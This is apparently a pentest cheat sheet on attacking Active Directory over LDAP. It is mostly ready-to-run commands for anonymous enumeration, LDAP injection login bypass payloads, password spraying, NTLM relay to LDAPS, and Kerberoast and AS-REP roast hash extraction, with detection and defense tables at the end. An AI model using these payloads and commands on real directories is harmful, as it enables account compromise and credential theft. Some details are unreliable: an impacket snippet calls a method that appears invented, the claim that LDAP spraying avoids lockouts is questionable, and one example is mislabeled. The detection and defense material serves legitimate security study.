# LDAP-Specific Attacks

Lightweight Directory Access Protocol (LDAP) is the primary directory access protocol in Active Directory. While LDAP is typically used for enumeration, it also introduces specific attack vectors including anonymous binds, injection, signing bypass, and password spraying.

## LDAP Anonymous Bind

Anonymous LDAP binds allow queries without authentication. Disabled by default on domain controllers since Windows 2003, but enabled on some configurations or non-Microsoft LDAP directories.

### Checking anonymous bind
```bash
# ldapsearch anonymous bind
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" -s base

# nxc ldap anonymous
nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users

# windapsearch anonymous
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u ""
```

### What anonymous bind reveals
```bash
# Get base DN and naming contexts
ldapsearch -x -H ldap://10.10.10.10 -s base -b ""

# Get domain info (functional level, etc.)
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" -s base

# Enumerate users (if allowed)
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(objectClass=user)"

# Enumerate groups (if allowed)
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" "(objectClass=group)"
```

### Impact
- Information disclosure (users, groups, computers, OUs, GPOs)
- Network footprinting from unauthenticated perspective
- Can lead to more targeted attacks if sensitive info exposed

### nxc anonymous LDAP check
```bash
# Full anonymous enumeration
nxc ldap 10.10.10.10 -u '' -p '' --users
nxc ldap 10.10.10.10 -u '' -p '' --groups
nxc ldap 10.10.10.10 -u '' -p '' -M get-desc-users
nxc ldap 10.10.10.10 -u '' -p '' -M adcs_check
```

---

## LDAP Without Authentication

Similar to anonymous bind but uses unauthenticated simple bind (different LDAP operation). May work when anonymous bind is disabled but unauthenticated simple bind is allowed.

```bash
# Unauthenticated simple bind
ldapsearch -h 10.10.10.10 -b "dc=domain,dc=local" -s base \
  -D "" -w "" objectClass=*

# nxc with no authentication
nxc ldap 10.10.10.10 -u 'guest' -p '' --users

# Python check
python3 -c "
from ldap3 import Server, Connection, ALL
server = Server('10.10.10.10', get_info=ALL)
conn = Connection(server, user='', password='', authentication='ANONYMOUS')
if conn.bind():
    print('Anonymous bind successful')
    print(conn.server.info)
"
```

---

## LDAP Injection

LDAP injection manipulates LDAP search filters by injecting special characters to bypass access controls or extract unauthorized data.

### Filter injection
```bash
# Normal filter
ldapsearch -x -H ldap://10.10.10.10 \
  -b "ou=users,dc=domain,dc=local" \
  "(uid=admin)"

# Injection attempt (bypass)
ldapsearch -x -H ldap://10.10.10.10 \
  -b "ou=users,dc=domain,dc=local" \
  "(uid=*)(uid=*)"

# Boolean-based injection
# If web app uses LDAP auth:
# username = admin)(&
# password = pass
# Results in filter: (&(uid=admin)(&)(userPassword=pass))
# The injection closes the first condition and makes the password check irrelevant

# Blind LDAP injection
# Test by injecting AND conditions
# Original: uid=user
# Injected: uid=user)(uid=*  (true - valid)
# Injected: uid=user)(uid=z  (false - invalid)
```

### Web application LDAP injection
```
# Typical LDAP auth filter
(&(uid=USER)(userPassword=PASS))

# Inject:
USER = admin)(&
PASS = anything
# Filter becomes: (&(uid=admin)(&)(userPassword=anything))
# Returns true -> authenticated as admin

# Inject comment:
USER = admin)(|(uid=*
PASS = anything
# Filter becomes: (&(uid=admin)(|(uid=*)(userPassword=anything))
# The |(uid=*)(userPassword=anything) is always true
```

### Exploitation tools
```bash
# jXPLorer - LDAP browser (graphical)
# LdapMiner - LDAP injection scanner
# Softerra LDAP Browser - LDAP browsing (Windows)

# Manual injection via ldapsearch
ldapsearch -x -H ldap://10.10.10.10 \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(sAMAccountName=admin*))"

# Extract using wildcards (blind)
ldapsearch -x -H ldap://10.10.10.10 \
  -b "dc=domain,dc=local" \
  "(sAMAccountName=a*)"
```

---

## LDAP-Based Password Spraying

Password spraying against LDAP is stealthier than SMB or Kerberos because LDAP auth attempts are less likely to trigger account lockouts and generate different event logs.

### nxc ldap password spray
```bash
# Single user, single password
nxc ldap 10.10.10.10 -u 'user' -p 'Password123'

# User list, single password (spray)
nxc ldap 10.10.10.10 -u users.txt -p 'Winter2024!' --continue-on-success

# User list, password list (brute-force, not spray)
nxc ldap 10.10.10.10 -u users.txt -p passwords.txt

# Spray with domain
nxc ldap 10.10.10.10 -u users.txt -p 'Spring2024!' -d domain.local

# Spray with LDAPS
nxc ldap 10.10.10.10 -u users.txt -p 'Password1' --ldaps
```

### kerbrute password spray (Kerberos-based)
```bash
# Password spraying via Kerberos AS-REQ (stealthier than LDAP)
kerbrute passwordspray -d domain.local users.txt 'Password123!' --dc 10.10.10.10
```

### windapsearch password spray
```bash
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u users.txt -p 'Password123!'
```

### Detection difference
- **LDAP spray**: Event ID 4625 (logon failure) with LogonType 3, typically from LDAP bind
- **Kerberos spray**: Event ID 4771 (Kerberos pre-auth failed)
- **SMB spray**: Event ID 4625 with LogonType 3, but also generates 5140 (SMB access)

---

## LDAP over SSL (LDAPS) Inspection

LDAPS (LDAP over TLS/SSL on port 636) encrypts LDAP traffic. Attackers can inspect LDAPS certificates for misconfigurations.

### Checking LDAPS certificate
```bash
# Connect with openssl to inspect cert
openssl s_client -connect 10.10.10.10:636 -showcerts

# Extract and analyze certificate
openssl s_client -connect 10.10.10.10:636 </dev/null 2>/dev/null | \
  openssl x509 -text -noout | grep -E "Subject:|Issuer:|Not Before|Not After|DNS:"

# nmap LDAPS certificate script
nmap --script ldap-rootdse -p636 10.10.10.10

# Check for weak ciphers
nmap --script ssl-enum-ciphers -p636 10.10.10.10
```

### LDAPS relay considerations
```bash
# LDAPS vs LDAP relay
# ntlmrelayx can relay NTLM to LDAP (port 389) or LDAPS (port 636)
# LDAPS adds TLS layer
ntlmrelayx.py -t ldaps://10.10.10.10 -smb2support

# If LDAP signing is required but LDAPS is not, relay via LDAPS
```

---

## LDAP Signing and Channel Binding

LDAP signing ensures LDAP traffic integrity. LDAP channel binding binds the outer TLS channel to the inner authentication.

### Checking LDAP signing
```bash
# nxc check LDAP signing
nxc ldap 10.10.10.10 -u user -p pass -M ldap-signing

# Manual registry check (on DC)
Get-ItemProperty HKLM:\SYSTEM\CurrentControlSet\Services\NTDS\Parameters | \
  Select LdapEnforceChannelBinding

# Check domain policy
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" \
  -D "CN=user,CN=Users,DC=domain,DC=local" -w pass \
  "(objectClass=domain)" ldapSigning
```

### LDAP signing values
| Value | Meaning |
|-------|---------|
| 0 | None (no signing required) |
| 1 | Negotiate signing (request but not require) |
| 2 | Require signing (mutual authentication required) |

### Impact of no LDAP signing
- NTLM relay to LDAP becomes possible
- Attacker can modify LDAP traffic in transit
- Shadow credentials can be added via relay
- ESC8 (ADCS Web Enrollment relay) works

### LDAP channel binding
```bash
# Check channel binding policy
nxc ldap 10.10.10.10 -u user -p pass -M channel-binding

# Registry: LdapEnforceChannelBinding
# 0 = Disabled
# 1 = When supported (preferred)
# 2 = Always (required)
```

---

## LDAP Referrals for Cross-Forest Attacks

LDAP referrals redirect LDAP queries from one domain to another. Attackers can abuse referrals for cross-forest enumeration or authentication forwarding.

### How referrals work
```
Client queries: "Find user in DC=domain,DC=local"
Domain A doesn't have the object
Domain A responds with: referral -> ldap://dc02.other.local/DC=other,DC=local
Client follows referral to Domain B's DC
```

### Abusing referrals
```bash
# Query with referral chasing enabled
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" \
  -D "CN=user,CN=Users,DC=domain,DC=local" -w pass \
  -o chase-referrals=true "(objectClass=user)"

# Disable referral chasing to avoid cross-forest leakage
ldapsearch -x -H ldap://10.10.10.10 -b "dc=domain,dc=local" \
  -D "CN=user,CN=Users,DC=domain,DC=local" -w pass \
  -o chase-referrals=false "(objectClass=user)"

# ADSI Edit (Windows)
# Set "Chase Referrals" to different values
```

### Cross-forest referral abuse
```bash
# Get trusts and find accessible foreign security principals
nxc ldap 10.10.10.10 -u user -p pass --trusted-for-delegation

# Enumerate across trust via referrals
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user@domain.local -p pass \
  --custom-filter "(objectClass=foreignSecurityPrincipal)"
```

---

## LDAP Queries That Trigger Replication

Certain LDAP queries force domain controllers to perform replication operations or return sensitive replication data.

### DRL (Domain Replication) via LDAP
```bash
# Query replication metadata
ldapsearch -x -H ldap://dc01.domain.local:389 \
  -D "CN=user,CN=Users,DC=domain,DC=local" -w pass \
  -b "DC=domain,DC=local" -a always -s base \
  "(objectClass=*)" replicationInfo

# Get highwatermark for replication
ldapsearch -x -H ldap://10.10.10.10 \
  -D "CN=user,CN=Users,DC=domain,DC=local" -w pass \
  -b "CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=domain,DC=local" \
  "(objectClass=*)" highWatermark
```

### DCSync via LDAP (DRSUAPI)
```bash
# DCSync is typically done via DRSUAPI over RPC
# but some LDAP queries can trigger replication

# Get replication cursor
python3 -c "
from impacket.ldap import LDAPConnection
conn = LDAPConnection('ldap://10.10.10.10', 'domain.local', 'user', 'pass')
conn.getReplCursors()
"
```

### msDS-RevealedUsers / msDS-RevealedList
```bash
# Some AD attributes reveal hidden users when queried
ldapsearch -x -H ldap://10.10.10.10 \
  -D "cn=user,cn=users,dc=domain,dc=local" -w pass \
  -b "dc=domain,dc=local" \
  "(objectClass=user)" msDS-RevealedUsers msDS-RevealedList
```

---

## LDAP-Based AS-REP Roasting Check

LDAP can identify users without Kerberos pre-authentication (AS-REP roast targets).

### nxc ldap AS-REP roast
```bash
# Find AS-REP roastable users
nxc ldap 10.10.10.10 -u user -p pass --asreproast asrep_hashes.txt

# This queries LDAP for users with UF_DONT_REQUIRE_PREAUTH flag set
# Then automatically requests TGT and extracts hash
```

### Manual LDAP query for AS-REP users
```bash
# Find users with no pre-auth required
ldapsearch -x -H ldap://10.10.10.10 \
  -D "cn=user,cn=users,dc=domain,dc=local" -w pass \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" \
  sAMAccountName
```

### PowerView AS-REP check
```powershell
Get-DomainUser -PreauthNotRequired -Properties samaccountname
```

---

## LDAP-Based Kerberoasting Check

LDAP identifies Service Principal Names (SPNs) for Kerberoasting targets.

### nxc ldap kerberoasting
```bash
# Find kerberoastable users
nxc ldap 10.10.10.10 -u user -p pass --kerberoast kerb_hashes.txt

# This queries LDAP for users with SPNs set
# Then requests TGS hashes
```

### Manual LDAP query for SPN users
```bash
# Find all users with servicePrincipalName set
ldapsearch -x -H ldap://10.10.10.10 \
  -D "cn=user,cn=users,dc=domain,dc=local" -w pass \
  -b "dc=domain,dc=local" \
  "(&(objectClass=user)(servicePrincipalName=*))" \
  sAMAccountName servicePrincipalName
```

### Filter specific SPN types
```bash
# Find MSSQL service accounts
ldapsearch -x -H ldap://10.10.10.10 \
  -D "cn=user,cn=users,dc=domain,dc=local" -w pass \
  -b "dc=domain,dc=local" \
  "(servicePrincipalName=MSSQLSvc/*)" \
  sAMAccountName servicePrincipalName

# Find HTTP SPNs
ldapsearch -x -H ldap://10.10.10.10 \
  -D "cn=user,cn=users,dc=domain,dc=local" -w pass \
  -b "dc=domain,dc=local" \
  "(servicePrincipalName=HTTP/*)" \
  sAMAccountName servicePrincipalName
```

---

## LDAP Attack Tools

### ldapsearch (OpenLDAP)
```bash
# Basic authenticated query
ldapsearch -x -H ldap://10.10.10.10 \
  -D "DOMAIN\user" -w "pass" \
  -b "dc=domain,dc=local" "(objectClass=user)" sAMAccountName

# LDAPS
ldapsearch -x -H ldaps://10.10.10.10 \
  -D "DOMAIN\user" -w "pass" \
  -b "dc=domain,dc=local" "(objectClass=*)"

# Dump all attributes for a user
ldapsearch -x -H ldap://10.10.10.10 \
  -D "DOMAIN\user" -w "pass" \
  -b "cn=administrator,cn=users,dc=domain,dc=local" "(objectClass=*)"

# Complex filter
ldapsearch -x -H ldap://10.10.10.10 \
  -D "DOMAIN\user" -w "pass" \
  -b "dc=domain,dc=local" \
  "(&(objectCategory=person)(objectClass=user)(!adminCount=1))" \
  sAMAccountName mail

# Limit results
ldapsearch -x -H ldap://10.10.10.10 \
  -D "DOMAIN\user" -w "pass" \
  -b "dc=domain,dc=local" -z 100
```

### nxc ldap
```bash
# User enumeration
nxc ldap 10.10.10.10 -u user -p pass --users
nxc ldap 10.10.10.10 -u user -p pass --active-users

# Group enumeration
nxc ldap 10.10.10.10 -u user -p pass --groups

# Computer enumeration
nxc ldap 10.10.10.10 -u user -p pass --computers

# Password policy
nxc ldap 10.10.10.10 -u user -p pass --pass-pol

# Domain trusts
nxc ldap 10.10.10.10 -u user -p pass --trusts

# AS-REP roast
nxc ldap 10.10.10.10 -u user -p pass --asreproast hashes.txt

# Kerberoast
nxc ldap 10.10.10.10 -u user -p pass --kerberoast hashes.txt

# BloodHound data collection
nxc ldap 10.10.10.10 -u user -p pass --bloodhound --collection-method LDAP

# GPO enumeration
nxc ldap 10.10.10.10 -u user -p pass -M gpo

# ADCS enumeration
nxc ldap 10.10.10.10 -u user -p pass -M adcs

# Get user descriptions (often contain passwords)
nxc ldap 10.10.10.10 -u user -p pass -M get-desc-users

# Check for constrained delegation
nxc ldap 10.10.10.10 -u user -p pass --trusted-for-delegation

# Check for RBCD
nxc ldap 10.10.10.10 -u user -p pass -M rbcd

# MAQ (Machine Account Quota)
nxc ldap 10.10.10.10 -u user -p pass -M maq

# Subnet enumeration
nxc ldap 10.10.10.10 -u user -p pass -M subnets

# Dump LDAP
nxc ldap 10.10.10.10 -u user -p pass -M ldap-dump --option 'DUMP_ALL=true'

# Use LDAPS
nxc ldap 10.10.10.10 -u user -p pass --ldaps
```

### windapsearch
```bash
# Basic user dump
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass

# All users
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -U

# Privileged users (Domain Admins)
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass --da

# All groups
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -G

# Computers
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -C

# OUs
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -O

# Domain admins members
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass --full-admin

# Custom filter
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass \
  --custom-filter "(servicePrincipalName=*)"

# Users with SPNs (kerberoast targets)
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass \
  --custom-filter "(&(objectClass=user)(servicePrincipalName=*))" --attrs sAMAccountName

# AS-REP roastable users
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass \
  --custom-filter "(userAccountControl:1.2.840.113556.1.4.803:=4194304)"

# User attributes
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass \
  --user-info --attrs mail,department,description

# Module (dump users without admin by checking DACLs)
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -m

# LAPS passwords
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass -M laps

# Full domain dump
windapsearch.py --dc-ip 10.10.10.10 -d domain.local -u user -p pass --dump
```

### ldap3 Python library (custom attacks)
```python
from ldap3 import Server, Connection, ALL, NTLM

server = Server('10.10.10.10', get_info=ALL)
conn = Connection(server, user='DOMAIN\\user', password='pass',
                  authentication=NTLM)
conn.bind()

# Search all users
conn.search('dc=domain,dc=local',
            '(objectClass=user)',
            attributes=['sAMAccountName', 'userPrincipalName', 'memberOf'])

# Search for kerberoastable
conn.search('dc=domain,dc=local',
            '(&(objectClass=user)(servicePrincipalName=*))',
            attributes=['sAMAccountName', 'servicePrincipalName'])

# Search for AS-REP roastable
conn.search('dc=domain,dc=local',
            '(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))',
            attributes=['sAMAccountName'])
```

### bloodyAD (LDAP object manipulation)
```bash
# User enumeration
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass get object 'CN=Administrator,CN=Users,DC=domain,DC=local'

# Get all users
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass get children 'CN=Users,DC=domain,DC=local'

# Password spray via LDAP
bloodyAD --host 10.10.10.10 -d domain.local -u user -p pass \
  test password --password 'Password123!'
```

---

## Detection & Signatures

| Event ID | Source | Indication |
|----------|--------|------------|
| 4625 | Security | LDAP bind failure (LogonType 3) |
| 4771 | Security | Kerberos pre-auth failure |
| 2886 | AD DS | LDAP bind succeeded |
| 2887 | AD DS | LDAP bind failed |
| 2889 | AD DS | LDAP anonymous bind |
| 1644 | AD DS | LDAP query (search) operation |
| 1008 | AD DS | LDAP query results (potential injection) |
| 4662 | Security | Operation on LDAP object (Audit Directory Service Access) |
| 5136 | Security | LDAP modify operation |
| 5137 | Security | LDAP create operation |
| 5141 | Security | LDAP delete operation |

**Network signatures:**
- High volume of LDAP search operations from single IP
- LDAP binds with various user names in quick succession (spray)
- LDAP anonymous bind followed by bulk search
- Queries with wildcard injections (`*)(&` patterns)
- LDAP queries from unexpected source IPs (non-DC machines)
- LDAPS starttls negotiation followed by bulk query
- Referral chasing queries across forests

## Defenses

| Control | Detail |
|---------|--------|
| Disable anonymous LDAP binds | Set `dsHeuristics` to block anonymous operations |
| Enable LDAP signing | GPO: `Domain controller: LDAP server signing requirements` |
| Enable LDAP channel binding | Set `LdapEnforceChannelBinding` to 2 (Always) |
| Enable LDAP over SSL | Require LDAPS for all directory operations |
| Audit LDAP queries | Enable `Audit Directory Service Access` for 4662 events |
| Query thresholds | Set LDAP query limits (MaxPageSize, MaxResultSetSize) |
| Network segmentation | Restrict LDAP access to domain controllers from admin subnets |
| Query filtering | Block LDAP injection payloads at application layer |
| Password spraying | Account lockout policy, smart cards, MFA |
| LDAP referrals | Restrict cross-forest referral chasing |

## References

- ldapsearch: https://linux.die.net/man/1/ldapsearch
- windapsearch: https://github.com/ropnop/windapsearch
- BloodyAD: https://github.com/CravateRouge/bloodyAD
- LDAP injection: https://owasp.org/www-community/attacks/LDAP_Injection
- LDAP signing/channel binding: https://support.microsoft.com/en-us/topic/kb4520412-2020-ldap-microsoft-windows
- nxc ldap: https://www.netexec.wiki/ldap-protocol
